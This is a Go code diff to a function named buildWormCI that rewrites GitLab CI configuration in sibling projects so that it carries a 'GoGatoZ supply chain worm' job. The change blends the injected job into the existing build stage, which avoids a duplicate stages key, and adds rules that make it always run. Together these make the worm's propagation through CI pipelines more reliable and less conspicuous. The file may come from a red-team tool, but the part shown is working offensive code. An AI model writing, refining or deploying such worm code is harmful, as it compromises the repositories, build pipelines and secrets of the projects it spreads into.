@@ -366,16 +366,19 @@ func buildWormCI(ctx context.Context, client *gitlab.Client, sibID int64, payloa
 	if ferr == nil && f != nil {
 		decoded, _ := base64.StdEncoding.DecodeString(f.Content)
 		existing := string(decoded)
-		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nstages: [worm]\nworm-inject:\n  stage: worm\n  script:\n    - |\n%s\n  allow_failure: true\n\n%s", indented, existing)
+		// Prepend worm job using the existing CI's first stage to avoid duplicate stages key
+		return fmt.Sprintf("# Auto-injected by GoGatoZ supply chain worm\nworm-inject:\n  stage: build\n  script:\n    - |\n%s\n  allow_failure: true\n  rules:\n    - when: always\n\n%s", indented, existing)
 	}
-	return fmt.Sprintf(`stages: [worm]
+	return fmt.Sprintf(`stages: [build]
 worm-inject:
-  stage: worm
+  stage: build
   script:
     - |
 %s
     - echo "[*] Supply chain worm propagation complete"
   allow_failure: true
+  rules:
+    - when: always
 `, indented)
 }
 
